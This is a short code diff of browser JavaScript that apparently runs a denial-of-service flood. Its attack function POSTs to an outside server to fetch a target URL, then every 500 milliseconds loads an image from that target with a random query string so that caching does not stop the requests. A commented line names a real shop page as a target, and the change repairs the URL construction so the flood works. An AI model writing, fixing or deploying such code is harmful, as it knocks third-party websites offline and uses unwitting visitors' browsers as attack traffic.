@@ -3,7 +3,7 @@ function floodRequest(target) {
   // var website = 'www.nichegardens.com/catalog/item.php?id=1911' //target
    var pic = new Image()
    var rand = Math.floor(Math.random() * 1000)
-   pic.src = 'http://'+target+rand+'=val';
+   pic.src = target+'?'+rand+'=val';
 }
 
 function attack(){
@@ -21,8 +21,6 @@ function attack(){
         target = this.responseText;
         console.log(target);
         setInterval(function(){floodRequest(target);}, 500);
-
-
       }
     });
     xhr.open("POST", "http://stme.esy.es/php/getdata.php");
